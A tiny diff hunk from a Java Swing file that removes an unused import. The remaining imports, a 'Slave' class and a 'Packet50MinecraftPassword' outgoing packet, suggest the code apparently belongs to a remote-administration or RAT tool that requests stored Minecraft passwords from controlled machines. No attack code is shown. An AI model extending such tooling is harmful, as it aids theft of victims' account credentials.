@@ -16,7 +16,6 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.outgoing.Packet50MinecraftPassword;
 
 @SuppressWarnings("serial")
